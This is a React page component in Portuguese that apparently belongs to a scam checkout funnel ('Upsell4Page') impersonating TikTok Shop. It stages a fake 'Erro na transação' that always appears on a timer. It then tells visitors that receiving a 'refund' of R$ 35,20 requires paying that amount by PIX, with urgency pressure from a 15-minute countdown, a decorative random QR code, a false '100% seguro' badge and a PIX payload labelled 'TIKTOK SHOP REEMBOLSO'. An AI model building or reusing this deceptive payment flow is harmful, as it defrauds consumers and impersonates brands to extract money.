import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { X, Copy, Clock, Loader2, XCircle, Info, Shield, CheckCircle } from "lucide-react";
import { toast } from "sonner";
import { Button } from "@/components/ui/button";
import tiktokLogo from "@/assets/upsell/tiktok-shop.png";
import slimhealthLogo from "@/assets/slimhealth-logo.png";
import cimedLogo from "@/assets/cimed-logo.png";

const Upsell4Page = () => {
  const navigate = useNavigate();
  
  // Phase control
  const [phase, setPhase] = useState<'loading' | 'content'>('loading');
  const [showError, setShowError] = useState(false);
  
  // Modal state
  const [showModal, setShowModal] = useState(false);
  const [timeLeft, setTimeLeft] = useState(900);

  // PIX code placeholder
  const pixCode = "00020101021226940014br.gov.bcb.pix2572qrcodespix.sejaefi.com.br/v2/cobfc73d8f1cc9a469c7b33e0e5d0e08a675204000053039865802BR5925TIKTOK SHOP REEMBOLSO6009SAO PAULO62070503***6304";

  // Loading phase animation
  useEffect(() => {
    if (phase !== 'loading') return;

    // Show error text after 2s
    const errorTimer = setTimeout(() => {
      setShowError(true);
    }, 2000);
    
    // Switch to content phase after 3s
    const phaseTimer = setTimeout(() => {
      setPhase('content');
    }, 3000);

    return () => {
      clearTimeout(errorTimer);
      clearTimeout(phaseTimer);
    };
  }, [phase]);

  // Modal timer
  useEffect(() => {
    if (!showModal) return;
    
    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev <= 1) {
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, [showModal]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const handleCopyPix = async () => {
    try {
      await navigator.clipboard.writeText(pixCode);
      toast.success("Código PIX copiado!");
    } catch {
      toast.error("Erro ao copiar código");
    }
  };

  const handleOpenModal = () => {
    setTimeLeft(900);
    setShowModal(true);
  };

  const handleSimulatePayment = () => {
    toast.success("Pagamento confirmado! Redirecionando para rastreio...");
    setShowModal(false);
    // Navigate to tracking page
    navigate("/rastreio");
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-white to-gray-50 flex flex-col">
      {/* Loading Phase */}
      {phase === 'loading' && (
        <div className="flex-1 flex flex-col items-center justify-center p-6">
          <div className="w-full max-w-md text-center space-y-6">
            {/* Spinner */}
            <div className="flex justify-center">
              <div className="w-16 h-16 rounded-full border-4 border-rose-100 border-t-rose-500 animate-spin" />
            </div>

            <div className="space-y-3">
              <p className="text-lg text-gray-600 font-medium">
                Processando seu pagamento...
              </p>
              
              {/* Error text with fade-in */}
              {showError && (
                <p className="text-rose-500 font-semibold animate-fade-in">
                  Erro na transação
                </p>
              )}
            </div>
          </div>
        </div>
      )}

      {/* Content Phase */}
      {phase === 'content' && (
        <>
          {/* Header */}
          <div className="bg-white px-4 py-4 flex justify-center">
            <img src={tiktokLogo} alt="TikTok Shop" className="h-10 w-auto" />
          </div>

          <div className="flex-1 flex flex-col items-center p-4">
            <div className="w-full max-w-md">
              {/* Main Container */}
              <div className="bg-white rounded-3xl shadow-lg border border-gray-100 p-6 space-y-5">
                
                {/* Card 1 - Error (Highlighted) */}
                <div className="bg-rose-50 rounded-2xl border-2 border-rose-500 p-6 text-center">
                  {/* 3D Icon with pulse */}
                  <div className="w-[70px] h-[70px] rounded-full flex items-center justify-center mx-auto mb-5
                    bg-gradient-to-br from-rose-500 to-rose-600
                    shadow-[0_8px_24px_rgba(244,63,94,0.4)]
                    animate-pulse">
                    <XCircle className="w-9 h-9 text-white" />
                  </div>
                  
                  <h1 className="text-2xl font-extrabold text-rose-500 mb-3">
                    Erro no Processamento
                  </h1>
                  <p className="text-gray-600 text-sm leading-relaxed">
                    Identificamos uma falha no processamento do seu reembolso. Para garantir que você receba o valor corretamente, precisamos que confirme o pagamento abaixo.
                  </p>
                </div>

                {/* Card 2 - Info */}
                <div className="bg-gray-50 rounded-2xl border-l-4 border-rose-500 p-5">
                  <div className="flex items-start gap-3">
                    <div className="w-5 h-5 flex items-center justify-center flex-shrink-0 mt-0.5">
                      <Info className="w-5 h-5 text-rose-500" />
                    </div>
                    <div>
                      <h2 className="font-bold text-[#1a1a2e] mb-2">
                        Processo de Reembolso
                      </h2>
                      <ul className="text-sm text-gray-600 space-y-1.5">
                        <li className="flex items-start gap-2">
                          <CheckCircle className="w-4 h-4 text-green-500 flex-shrink-0 mt-0.5" />
                          <span>O valor será reembolsado após confirmação</span>
                        </li>
                        <li className="flex items-start gap-2">
                          <CheckCircle className="w-4 h-4 text-green-500 flex-shrink-0 mt-0.5" />
                          <span>Reembolso na mesma forma de pagamento</span>
                        </li>
                        <li className="flex items-start gap-2">
                          <CheckCircle className="w-4 h-4 text-green-500 flex-shrink-0 mt-0.5" />
                          <span>Prazo varia conforme seu banco</span>
                        </li>
                      </ul>
                    </div>
                  </div>
                </div>

                {/* Card 3 - Value */}
                <div className="bg-white rounded-2xl shadow-md border border-rose-100 p-6 text-center">
                  <p className="text-xs text-gray-400 uppercase tracking-wider font-semibold mb-3">
                    Valor a ser Reembolsado
                  </p>
                  <p className="text-5xl font-extrabold text-rose-500 relative inline-block mb-4">
                    R$ 35,20
                    <span className="absolute bottom-[-5px] left-[10%] w-[80%] h-[3px] 
                      bg-gradient-to-r from-transparent via-rose-500 to-transparent rounded" />
                  </p>
                  <p className="text-sm text-gray-500 mt-4">
                    Clique abaixo para confirmar o pagamento e iniciar o reembolso
                  </p>
                </div>

                {/* CTA Button */}
                <Button
                  onClick={handleOpenModal}
                  className="w-full bg-gradient-to-r from-rose-500 to-rose-600 hover:from-rose-600 hover:to-rose-700 text-white font-bold py-5 rounded-2xl shadow-lg text-lg h-auto"
                >
                  CONFIRMAR PAGAMENTO
                </Button>

                {/* Security Badge */}
                <div className="flex items-center justify-center gap-3 bg-gray-50 rounded-xl p-4">
                  <Shield className="w-5 h-5 text-green-500" />
                  <span className="text-sm text-gray-600 font-medium">
                    Pagamento 100% seguro e criptografado
                  </span>
                </div>

                {/* Support Text */}
                <div className="bg-gray-50 rounded-xl p-4 border-l-4 border-rose-500">
                  <p className="text-sm text-gray-600">
                    Em caso de dúvidas, nossa{' '}
                    <a href="#" className="text-rose-500 font-semibold hover:underline">Central de Ajuda</a>
                    {' '}está disponível 24h para auxiliar você.
                  </p>
                </div>

                {/* Footer logos */}
                <div className="flex items-center justify-center gap-3 pt-4">
                  <img 
                    src={slimhealthLogo} 
                    alt="SlimHealth" 
                    className="h-7 object-contain opacity-70"
                  />
                  <span className="text-lg font-bold text-muted-foreground">+</span>
                  <img 
                    src={cimedLogo} 
                    alt="CIMED" 
                    className="h-5 object-contain opacity-70"
                  />
                </div>
              </div>
            </div>
          </div>
        </>
      )}

      {/* Payment Modal */}
      {showModal && (
        <div 
          className="fixed inset-0 z-50 bg-black/60 flex items-center justify-center p-4"
          onClick={() => setShowModal(false)}
        >
          <div 
            className="bg-white w-full max-w-sm rounded-2xl overflow-hidden shadow-2xl"
            onClick={(e) => e.stopPropagation()}
          >
            {/* Modal Header */}
            <div className="bg-white px-4 py-3 flex items-center justify-between">
              <div className="w-8" />
              <img src={tiktokLogo} alt="TikTok Shop" className="h-8 w-auto" />
              <button 
                onClick={() => setShowModal(false)}
                className="w-8 h-8 flex items-center justify-center rounded-full hover:bg-gray-100 transition-colors"
              >
                <X className="w-5 h-5 text-gray-500" />
              </button>
            </div>

            {/* Modal Content */}
            <div className="p-6">
              {/* Title and Value */}
              <div className="text-center mb-4">
                <p className="text-gray-500 text-sm font-medium">Confirmação de Reembolso</p>
                <p className="text-3xl font-bold text-gray-900 mt-1">R$ 35,20</p>
              </div>

              {/* QR Code */}
              <div className="flex justify-center mb-4">
                <div className="w-48 h-48 bg-gray-100 border-2 border-gray-200 rounded-lg flex items-center justify-center">
                  <div className="w-36 h-36 bg-gray-200 rounded grid grid-cols-6 grid-rows-6 gap-0.5 p-2">
                    {Array.from({ length: 36 }).map((_, i) => (
                      <div 
                        key={i} 
                        className={`rounded-sm ${Math.random() > 0.4 ? 'bg-gray-800' : 'bg-white'}`}
                      />
                    ))}
                  </div>
                </div>
              </div>

              {/* Copy Button */}
              <Button
                onClick={handleCopyPix}
                className="w-full bg-rose-500 hover:bg-rose-600 text-white font-semibold py-3 rounded-xl flex items-center justify-center gap-2"
              >
                <Copy className="w-5 h-5" />
                Copiar código PIX
              </Button>

              {/* Timer */}
              <div className="flex items-center justify-center gap-2 mt-4 text-amber-600">
                <Clock className="w-4 h-4" />
                <span className="text-sm font-medium">
                  O PIX expira em: <span className="font-bold">{formatTime(timeLeft)}</span>
                </span>
              </div>

              {/* Waiting confirmation */}
              <div className="flex items-center justify-center gap-2 mt-2 text-amber-600">
                <Loader2 className="w-4 h-4 animate-spin" />
                <span className="text-sm">Aguardando confirmação...</span>
              </div>

              {/* PIX code truncated */}
              <p className="text-xs text-gray-400 text-center mt-4 break-all line-clamp-2 px-2">
                {pixCode}
              </p>

              {/* Simulate payment button (for testing) */}
              <Button
                onClick={handleSimulatePayment}
                variant="outline"
                className="w-full mt-4 border-gray-300 text-gray-600 font-medium py-2 rounded-xl"
              >
                Simular Pagamento (Teste)
              </Button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default Upsell4Page;
